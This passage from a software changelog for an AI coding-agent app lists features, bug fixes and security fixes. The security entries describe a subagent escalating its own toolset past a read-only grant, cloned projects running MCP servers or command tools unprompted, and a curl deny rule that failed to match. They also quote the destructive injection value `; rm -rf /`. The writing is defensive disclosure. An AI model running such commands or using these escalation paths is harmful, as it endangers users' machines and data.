  likely accidental disclosure in the product, because it needs no attacker and
  no mistake, only the habit everyone already has. A `.gitignore` is now written
  *inside* `.quickcode/` when that directory is created — deliberately not the
  user's own `.gitignore`, since silently editing a file they own and have
  committed is not something this app should do. Transcripts, task boards,
  subagent artifacts and this machine's permission grants are excluded;
  `settings.json`, `agents/` and `plugins/` are not, because those are project
  configuration meant to be reviewed and shared. Written once and never
  rewritten: if the file is already there, it is yours. A test runs a real
  `git init` and `git add -A` and asserts the transcript is not staged while
  `settings.json` is.
- **The Windows bootstrap ran unverified installers.** `scripts/bootstrap.ps1`
  downloaded Git for Windows and Python over HTTPS and executed them silently,
  checking nothing — code execution at setup time for anyone who could answer
  for those hosts. Both are now Authenticode-verified before they run, checking
  the signing subject as well as the status, because a valid signature by the
  wrong publisher is not a pass. A pinned SHA-256 was considered and rejected:
  it nails one build forever, so a year on the script would install a Git with
  known CVEs, and a mistyped digest fails identically to an attack. On failure
  the file is deleted first and the install stops with the observed signer, the
  expected publisher and three real remedies — never downgraded to a warning,
  not even for Git, which the script otherwise treats as optional. TLS 1.2 is
  now forced, since PowerShell 5.1 inherits .NET's legacy default and on older
  builds still offers TLS 1.0.
- **The OpenRouter attribution header named someone else.** `HTTP-Referer` was
  `https://github.com/quickcode`, an unrelated URL that does not resolve, so the
  app identified itself to a third party as a project that is not this one.

### Fixed

- **Startup showed nothing at all, then everything at once.** Importing the
  CLI cost 1.21 s warm and 823 ms of that was the OpenAI SDK — almost entirely
  Pydantic model trees for Assistants, graders, evals, batches and responses,
  none of which the adapter touches. Cold, with a virus scanner reading each
  of those files for the first time out of a freshly installed venv, that is
  the difference between a few seconds and a minute of a window that does not
  exist yet. The SDK now loads when the client is first used rather than when
  the module is imported, and the client is built on first access rather than
  in the constructor: importing the CLI is **0.34 s**, and `openai` is absent
  from `sys.modules` until a request needs it — by which point the wait is
  hidden behind model latency. A test pins it in a fresh interpreter, because
  a single stray top-level import would silently undo it.
- **The permission mode was announced on every single turn.** The same
  sentence, unchanged, spliced into every request for the life of a session —
  a fixed tax that told the model nothing it had not already been told, and
  trained it to skim the block that also carries the things that *did* change.
  Reminders are edge-triggered now, the way the post-compaction one directly
  above it in the same function always was: the first turn announces the mode
  and after that only a change does, and anything else can queue a reminder
  that is delivered exactly once. Compaction re-announces, because it rewrites
  the transcript and the sentence may not have survived the summary — and the
  mode is what tells the model whether it may touch files, so the safe
  direction to be wrong is to repeat it.
- **The token count froze mid-answer.** Usage is reported once per round, so
  during a long streaming reply the number sat still for a minute and then
  jumped. On a line whose whole job is to show the app is alive, a frozen
  number argues the opposite. The frontend now estimates between authoritative
  figures — counting text, reasoning and the arguments of still-streaming tool
  calls, since a long file write spends most of its round inside tool
  arguments — and reconciles to truth at every round boundary. The count never
  goes backwards: when truth lands below the estimate the display holds until
  truth overtakes it, because a counter that jumps down reads as a bug. No new
  timer and no extra repaints.
- **A provider or MCP server page was a dead end.** Those kinds declare no
  settings, so they rendered no block for a "why can I not change this"
  explanation to live in — the user got a page with nothing on it and no
  account of why. They now say so, and say what to do instead.
- **A settings button shipped in a state it was not in.** `explain.js`
  rendered the Duplicate button disabled with "arrives in the next pass" and
  `detail.js` repaired it after render. The repair worked, but the stale
  promise was what the module shipped, so any other surface rendering that
  block got the dead version. It is now rendered in its real state to begin
  with. Two comments describing an app that no longer exists were corrected in
  the same pass.
- **The docs described an app that does not exist.** Twenty contradictions
  between `docs/` and the code, ten of them in `PERMISSIONS.md`, and `git log
  -S` settled that none regressed from this release's security work — there was
  never an `auto-edit` allowlist containing `mkdir`, never a gitignore-style
  matcher, never a four-scope rule chain, never PowerShell alias
  canonicalisation. They were never true, which is worse than stale: each reads
  as a guarantee, and a reader deciding whether to run this on a work machine
  was being told protections existed that were only prose. Two shipped examples
  were actively dangerous — `deny: ["bash(curl *)"]` does **not** deny
  `curl https://host/x.sh`, because `*` stops at `/`. Where the documented
  behaviour was better than the built behaviour, the gap is now stated rather
  than deleted. `tests/test_docs_accuracy.py` keeps it that way: 73 tests that
  extract a structure — a fenced block, a table column, a backticked
  identifier — and evaluate it against the real object, rather than grepping
  for a word while the sentence around it lies.
- **CI had never once passed**, including on the v2.0.0 tag — a red mark on
  what is now a public repository. `dev` is a PEP 735 dependency group rather
  than an extra, so `pip install -e ".[dev,pty]"` installed neither ruff nor
  pytest and both steps died on a missing module; and the runs reported
  `startup_failure` while the repository was private, which is what exhausted
  Actions minutes look like. The workflow now uses uv, which is how the
  project is actually developed, and tests 3.12, 3.13 and 3.14 with
  `fail-fast` off. It also runs `node --check` over every frontend module —
  the frontend has no build step, so nothing else would catch a syntax error
  before it failed to load in a browser.

## [2.0.0] — 2026-08-18

The plugin overhaul: every agent capability —
tools, prompt sections, providers, subagents, MCP servers — becomes a
declared plugin with its own mutability tier, and the tool/permission
coupling that used to live in name lists moves onto the tools themselves.

### Added

- **Plugin kernel** (`quickcode/kernel/`) — a single registry
  (`kernel/registry.py`) that answers "what does this install actually
  consist of" for tools, prompt sections, providers, subagents, and MCP
  servers alike. Each plugin is a `PluginSpec` (`kernel/spec.py`) with typed
  `SettingSpec` knobs gated by a three-tier mutability model — `free`
  (change it, nothing asks), `confirm` (requires `confirmed=True`, the
  dialog names the risk), `locked` (not editable, but always viewable — the
  tool-call protocol and the event log format are `locked`, not hidden).
  `kernel/bootstrap.py` assembles the live registry from the real tool
  registry, provider factories, subagent definitions, and MCP configs, so
  the Settings UI shows the install the runtime actually has, not a
  lookalike.
- **Native app window module** (`quickcode/ui/window.py`) — extracted the
  pywebview window lifecycle (create, size, min-size, close callback) into
  its own module, with an explicit `available()` capability check and a
  documented fallback to the system browser when pywebview or its native
  runtime is missing.
- `quickcode/core/hooks.py` — loop lifecycle hook points for plugins.
- **Session archival and deletion.** Archiving moves the log to
  `sessions/archive/<id>.jsonl` rather than writing a meta flag, so an older
  build — whose listing paths all use a non-recursive glob — simply never
  sees archived sessions instead of having to understand a record it has
  never heard of. `SessionStore.path` resolves active then archived, so an
  archived log stays readable and appends to the same bytes; opening one
  restores it, since a live-but-hidden conversation is the worst of both
  states. Deletion now also removes the session's task board and its
  subagent artifacts — ownership is recovered from the offload marker in the
  log, because agent ids (`{name}-{n}`, from a per-conversation counter)
  collide across sessions, and a file is removed only when no surviving
  session still references it. Archive, unarchive, delete, bulk delete and a
  sweep for sessions that never produced a transcript, on both the unscoped
  and project-scoped route shapes; a live session refuses all of them with a
  409 rather than having its file moved out from under its writer.

- **Configuration is a view, organised around agents.** Settings was a modal
  holding a flat list of 38 plugin cards ordered by implementation
  neighbourhood. It is now a third top-level view routed by URL, whose spine
  is Agents → Compositions → Parts → Machine room → Install: the primary
  object is the agent, and plugins are parts you attach to one. The flat list
  becomes a search box. Kind owns the card's hue and tier owns its badge, so
  an amber tool never reads as pending confirmation; a locked setting shows
  no control at all, keeping the value legible and selectable alongside the
  reason it is fixed and a real way forward.
- **Every plugin and setting explains itself in the same shape** — what it
  is, what it affects, who it affects, what changes if you change it, why it
  is fixed, and what to do instead. Written once in the manifest for all 37
  internal plugins, so a reader who learns one card can read them all.
- **Plugins you can write as markdown files.** Three of the five kinds are now
  authorable without Python: a **command tool**, a **subagent**, and a **prompt
  section**, dropped in `~/.quickcode/plugins/*.md` for every project or
  `<project>/.quickcode/plugins/*.md` for one, with the kind in the
  frontmatter and the interesting part in the body. Command tools are
  argv-first — the argv is a JSON array and parameters substitute into
  elements, so a value can never become two arguments and there is no shell to
  quote against; `shell:` is refused rather than quietly ignored. A declared
  `read_only: true` is recorded and grants nothing, because the only available
  check for "does this program write" is that there is none: the card says so,
  and an argv containing something like `push` or `rm` raises a warning against
  the claim. Ids are refused on collision rather than shadowed, with Duplicate
  offered as the way forward — `.quickcode/` is committed, so letting a
  project's file stand in for `tool.bash` would be a supply-chain hole — and
  the reserved set is read off the live objects, so a new built-in is reserved
  the moment it exists. Validation runs twice: authoritative on load, advisory
  on save, and saving a file that does not yet parse is allowed and returns its
  problems, because refusing to save work in progress is how an editor loses
  it.
- **Duplicate anything, and get a file you own.** Press Duplicate on
  `agent.explore` — locked, required, built-in — and get an editable markdown
  file with `derived_from` set, every previously locked line plain text, and
  the original untouched. A locked prompt section duplicates as a *sibling*
  with `after:` pointing at the original, because two sections claiming one
  position is not a copy. Internal tools refuse with the reason shown and
  **New command tool** offered in its place: a Python tool's behaviour is not
  expressible as an argv template, and pretending otherwise would produce a
  file that lies about what it does. Alongside it: `New…` for the three
  authorable kinds, an editor page with its own URL where the raw file is the
  primary surface and the panel beside it is commentary, source and scope
  filters, and empty states that name a real plugin and offer to copy it.
- **A dry run that resolves the argv and never executes it.** One field per
  declared parameter, the command rendered element by element as you type.
  There is no run button and the panel says why — "run it once to check"
  would be a second route to execution that skips the permission gate, and
  the approval prompt already shows this exact array. A parameter value of
  `; rm -rf /` renders as one inert argument, which is argv-first made
  visible.
- **A Problems card**, pinned above every Parts page and with a page of its
  own. A plugin that failed to load appears here and *not* in the plugin list,
  which is the point: a plugin that silently vanished is a worse bug than one
  that refuses loudly. Problems naming no plugin — an unparseable `kind:`, a
  project whose command tools are inert for want of trust — appear on every
  Parts page, because those are precisely the ones that cannot be attached to
  a row and would otherwise be the ones nobody sees.
- **`used_by`: what moves if you change this.** Every plugin payload now
  carries the compositions and agent definitions that hold it, each with the
  sentence saying *how* ("its orchestrator holds it", "matched by `mcp__*` in
  its tools") and an address to open. Compositions are answered by resolving,
  so bindings, `base:` inheritance and revokes fold in; agent definitions by
  what they declare, which is also the file you would go and edit. The index
  is cached per registry instance and never process-wide — the registry is
  rebuilt per request deliberately, and a longer-lived cache would serve the
  composition you had before your edit.
- **Cross-links from the transcript into configuration.** A tool call in the
  chat or the trajectory is one click from the card that governs it, and both
  views resolve that target through the same function so they cannot drift
  about which page decides what a tool may do. `composition_changed` renders
  as a readable summary instead of raw JSON, and the search box ranks results
  — exact, then id prefix, then title prefix, then substring — instead of
  returning them in registry order.
- **An agent workbench.** Every agent, including `@orchestrator`, has a page
  that answers what it will actually be sent and who decided each part: the
  resolved composition with provenance in place, the composed prompt with its
  section boundaries drawn and its *absences* explained, and the real tool
  schemas with byte counts and per-tool denial reasons. The preview calls the
  runner's own resolver and renderers rather than reconstructing anything, and
  an unsaved draft travels the same path, so what you see before saving is what
  runs after. The tool picker edits **patterns**: granting a family writes the
  glob and the rows say they were matched by it, because expanding `task_*`
  into today's five names silently freezes the set against tomorrow's sixth.
- **Compositions can be switched inside a session**, at a turn boundary. The
  composition stays frozen for the duration of a turn, so a switch during one
  is refused with its reason; a switch that lands re-resolves, rebuilds the
  registry and permission specs, clamps the mode to the new ceiling, re-renders
  the prompt from the new bodies, and writes a marker into the transcript so
  the record shows the agent changed underneath it rather than appearing to
  contradict itself.
- **One composition model for the orchestrator and its subagents.**
  Capability fields (tools, spawnable agents, model set, permission ceiling)
  combine by intersection, so resolution order cannot change the answer;
  value fields resolve last-writer-wins over named layers. Every resolved
  value carries the provenance that set it. Resolution is total and reports
  problems; spawning stays fallible and refuses before an agent id is minted.

### Changed

- **Tools declare their own permission shape.** `Tool.permission` is now a
  `PermissionSpec` (`quickcode/core/permissions.py`) carried on the tool
  class itself — whether it mutates, which input field is the match target,
  whether that target is a filesystem path or a shell command line. The
  permission engine reads this off the tool instead of keeping internal name
  lists, so a plugin tool gets exactly the protection a built-in tool gets
  the moment it declares its shape; an undeclared tool defaults to the
  cautious `PermissionSpec()` (mutating, prompted).
- **System prompt composed from sections.** `quickcode/prompts/sections.py`
  replaces the single conditional format string with an ordered list of
  `PromptSection`s (identity, tone, autonomy, conventions, task management,
  tool-use policy, verification, environment, project instructions,
  orchestration, plan mode, headless mode), each with an id, an order, a
  mutability tier, and a renderer. `compose()` joins the non-empty sections
  and reports the byte offsets each one landed at, so the Settings UI can
  show which part of the prompt came from where — while keeping the same
  cache-stable, byte-for-byte output the single-template version produced.
  The locked sections (tool-use policy, environment) stay exactly that:
  visible, never editable.

### Fixed

- **A resumed session remembers what it cost.** The token ledger lived only
  in the running process, so reopening a session reported zero tokens and no
  spend. `Ledger.from_events()` rebuilds it from the logged `usage` events:
  what a session cost is a fact about the session, not about the process
  that happened to be running it. Sessions whose logs predate usage events
  genuinely have nothing to restore and still show zero.
- **Chat transcript alignment.** Messages, steps and tool cards each centred
  themselves independently, so nothing shared a left edge; inside a step a
  card with `margin: 0 auto` shrank to its own content width and landed
  somewhere different again. The step is now the single column element and
  its children align to it.
- Step headings derive from the tool names they contain instead of repeating
  the assistant message directly above them.
- Sessions interrupted before their first message record listed as "(empty)"
  with no title, despite having a full event log; titles and counts now fall
  back to the event log.
- `PUT /api/kernel/plugins/{unknown-id}` returned 500 instead of 404.
- **Six settings did nothing.** `max_rounds`, all three compaction knobs and
  both subagent limits rendered, accepted edits and saved while the runtime
  read module constants. They now decide what they claim to decide, read
  through one declaration so the card and the runtime cannot drift. The two
  subagent limits remain backstops: a settings file asking for `max_depth:
  99` gets the 4 its own card promises.
- `keep_turns` declared a minimum of 0 and computed `user_idxs[-0]` — which
  is `user_idxs[0]` — so the smallest value a user could choose kept the
  entire transcript verbatim, the opposite of the control's meaning.
- `max_depth: 0` did nothing, because the depth check exempted the
  orchestrator. Zero now means no delegation at all.
- Every tool card badged "locked", because a tool's only setting is the
  read-only flag it declares about itself. A declared fact is now
  distinguished from a knob withheld to defend an invariant.
- **A headless run recorded nothing.** `quickcode -p` wrote a session file
  containing one `meta` line: the log is written by whoever subscribes to the
  agent's event bus, and the headless path subscribed to nothing, so every
  event was fanned out to zero listeners and dropped. The session looked real
  and was permanently empty — "every run is traceable" was false for `-p`, and
  `--continue` resumed an empty conversation. The recorder is now extracted
  into `session/recorder.py` and used by both entry points, rather than a
  second implementation that could differ by which one wrote the log.
- Session titles preferred the persisted message, which carries what the
  *model* was sent — `<system-reminder>` blocks and all — over the event,
  which carries what the person typed.
- The dry run's one-line summary joined the argv unquoted, so a parameter
  value of `; rm -rf /` rendered as a line that reads exactly like the shell
  command the panel exists to prove cannot happen.
- The trust re-prompt could not say what changed for a project whose
  executable config is command tools: the browser recorded only servers, then
  reported having no record of what was approved.
- Refusing to duplicate a built-in tool put the reason in a tooltip, so a
  reader who never hovered saw one button silently become another.
- Granting trust changes which tools exist, but a configuration view mounted
  before the grant kept quoting the pre-grant count beside a picker that had
  refetched the new one.

### Security

- **Subagent delegation could escalate its own toolset.** A child's
  `tool_pool` was passed down unchanged, so a grandchild resolving
  `tools: null` inherited the whole *session* pool rather than its parent's
  grant: the read-only `explore` agent — documented as unable to be talked
  into writing, because the tools are not there — could spawn `general` and
  obtain `write`, `edit`, `bash` and the task tools. The permission ceiling
  still held for files and shell (a subagent's callback denies), but the
  task tools declare `mutates=False` and did execute. A child's delegation
  pool is now the tools that child was itself granted.
- **Opening a project executed its MCP servers.** A project's
  `.quickcode/settings.json` could declare `mcpServers`, and
  `POST /api/projects/open` spawned them with no prompt — cloning a
  repository and opening it to look at it was arbitrary code execution.
  Project-scope servers are now inert until that project is trusted once.
  Trust is recorded at user scope, never inside the project (a project must
  not be able to declare itself trustworthy), and each grant is bound to a
  hash of the `mcpServers` block, so adding a server later re-prompts instead
  of riding the old approval. The launch directory is not implicitly trusted:
  cloning a repository and running `qc .` in it is precisely the attack.
  User-scope servers stay ungated — they are the user's own files, and
  prompting for them would train the reflex that makes the project prompt
  worthless. The refusal is loud: the project opens and reports which servers
  it did not start, and the prompt shows each full command line before you
  approve it, because approving a command you cannot read is not consent.
- **The trust grant covers authored command tools, not just MCP servers.** A
  project can name a program to run in two places — `mcpServers` in its
  settings, and a `kind: tool` file in `.quickcode/plugins/` — and both are
  committed to the repository. Binding trust to the servers alone would have
  left the second door open: a project already approved for its servers could
  add a command tool afterwards and have it run with no prompt. The grant is
  now bound to a hash over both, so adding or editing either one re-prompts,
  and a file whose `kind:` cannot be parsed is treated as a tool, because the
  unreadable case is the one an attacker controls. Authored agents and prompt
  sections stay ungated: they are text, they cannot widen a capability
  (tool lists and ceilings are intersected, never unioned), and this app
  already quotes a repository's own `QUICKCODE.md` into the prompt untrusted.
  The prompt shows each refused tool's argv, read from the file for display —
  an untrusted tool is not registered, so without that the banner would be
  asking for consent to a filename.

## [1.0.0] — 2026-08-17

First tagged release. Everything up to this point was developed directly on
`main`; this entry summarizes that history by theme rather than by commit.

### Added

- **Web UI rewrite.** Replaced the Textual TUI with a local FastAPI server
  plus a vanilla-JS frontend (no Node build step) opened in a native window.
  Every run is traceable: the append-only session event log records the
  system prompt, context injections, tool calls and results, subagent
  activity, and permission decisions. The **Trajectory** view renders that
  log as an inspectable table (role chips, timeline strip, search, per-event
  Summary/Payload/Result/Timing inspector) alongside **Chat**, switchable or
  side-by-side in **Split** view; resume and replay operate on the same
  event stream.
- **Multi-project hosting.** One running app hosts many projects like editor
  windows — the launch directory is the default project, further
  directories open on demand through `/api/projects/open`, and recently
  opened projects persist to `~/.quickcode/projects.json`. `qc [path]
  [prompt]` opens a project directly, optionally with a first prompt.
- **Provider-agnostic core.** Models are reached through a pluggable
  provider layer (OpenRouter by default, any OpenAI-compatible endpoint by
  config); the agent loop speaks a normalized event stream that provider
  adapters translate to and from.
- **Permission engine.** Modes from `plan` through `yolo`, a rules engine
  (`allow`/`ask`/`deny`) with bash command decomposition (parse, don't
  prefix-match), protected-path prompting (`.git`, `.env`, `.ssh`, outside
  the project root), and circuit breakers for catastrophic commands that
  prompt even in `yolo`.
- **Subagent fan-out.** Concurrent subagent delegation via the `agent` tool,
  a `send_message` tool to resume a finished subagent with its context
  intact instead of respawning, and a FleetView-style side panel showing
  subagent status and working-context usage.
- **Tasks and plan mode.** A shared task board tool, and a plan-mode gate
  that structurally withholds mutating tools and routes the model through
  an explicit plan-review step.
- **PTY-backed bash tool** using `pywinpty` (ConPTY) on Windows and the
  POSIX `pty` module elsewhere, patterns carried over from QuickTerm.
- **Compaction** before context overflow, with a dedicated summarization
  prompt.
- **Session resume and replay** from the same JSONL event log used for the
  trajectory view.
- **Read-only git endpoints** and Files / Usage side panels (status, diff,
  branch) scoped per project.
- **Composer parity features**: input history, a slash-command menu, a help
  modal, queued sends while the agent is busy.
- **Blue ghost branding**, an application icon set, and a Windows installer
  (`packaging/quickcode.iss`, Inno Setup) that provisions Git/Python,
  creates a private venv under the install directory, and adds `quickcode`
  / `qc` to `PATH`.
- **Native app window** via pywebview (WebView2 on Windows), plus a
  `quickcode-app` GUI entry point (no console window) used by the installer
  shortcuts, opening the user's home directory as the default project.
- **Settings**: General / Models / Plugins tabs, including a full model
  catalog and encrypted API key storage.
- **UI polish**: anchored scrolling menus that stay inside the viewport,
  Esc-closable modals, a maximizable trajectory timeline, and a live-follow
  mode for the trajectory view with pause.
- **Replay fixes**: corrected a wipe-on-reopen bug so reopening a session
  restores its transcript instead of clearing it.

### Fixed

- Various UX and permission-hardening passes: identity hardening, response
  budget capping, 402 error handling, model-switch persistence.

## [0.1.0] — unreleased internal milestone

The original Textual TUI implementation (M0 skeleton through M4 core:
provider abstraction, tool registry, PTY sessions, plan mode, compaction,
subagent delegation via the agent tool) before the web UI rewrite replaced
it. Not published as a release artifact.

[Unreleased]: https://github.com/devincii-io/QuickCode/compare/v2.4.1...HEAD
[2.4.1]: https://github.com/devincii-io/QuickCode/compare/v2.4.0...v2.4.1
[2.4.0]: https://github.com/devincii-io/QuickCode/compare/v2.3.0...v2.4.0
[2.3.0]: https://github.com/devincii-io/QuickCode/compare/v2.2.0...v2.3.0
[2.2.0]: https://github.com/devincii-io/QuickCode/compare/v2.1.0...v2.2.0
[2.1.0]: https://github.com/devincii-io/QuickCode/compare/v2.0.0...v2.1.0
[2.0.0]: https://github.com/devincii-io/QuickCode/compare/v1.0.0...v2.0.0
[1.0.0]: https://github.com/devincii-io/QuickCode/releases/tag/v1.0.0
